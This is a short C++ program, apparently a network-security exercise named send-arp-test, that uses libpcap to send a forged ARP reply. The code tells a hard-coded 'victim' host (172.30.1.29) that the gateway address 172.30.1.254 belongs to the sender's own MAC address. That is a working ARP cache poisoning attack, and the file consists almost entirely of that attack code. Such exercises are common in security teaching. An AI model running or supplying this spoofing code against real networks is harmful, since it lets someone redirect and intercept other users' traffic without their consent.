#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <malloc.h>

//MAC주소 길이
#define MAC_ALEN 6
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

//my MAC address
int GetInterfaceMacAddress(const char *ifname, uint8_t *mac_addr){
    struct ifreq ifr;
    int sockfd, ret;

    printf("Get interface(%s) MAC address\n", ifname);

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0){
        printf("Fail to get\n");
        return -1;
    }

    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
    ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
    if (ret < 0){
        printf("Fail to get\n");
        close(sockfd);
        return -1;
    }
    memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);

    close(sockfd);
    return 0;
}

int main(int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

    EthArpPacket packet;
    uint8_t MAC_ADD[MAC_ALEN];
    GetInterfaceMacAddress(dev, MAC_ADD);

    //printf("Success MAC : %02X:%02X:%02X:%02X:%02X:%02X\n", MAC_ADDR_FMT_ARGS(MAC_ADD));

    packet.eth_.dmac_ = Mac("B4:2E:99:EC:EB:DA");
    packet.eth_.smac_ = Mac(MAC_ADD);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = Mac(MAC_ADD); //gateway mac to mine
    packet.arp_.sip_ = htonl(Ip("172.30.1.254")); //gateway ip
    packet.arp_.tmac_ = Mac("B4:2E:99:EC:EB:DA"); //victim mac
    packet.arp_.tip_ = htonl(Ip("172.30.1.29"));  //victim ip

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
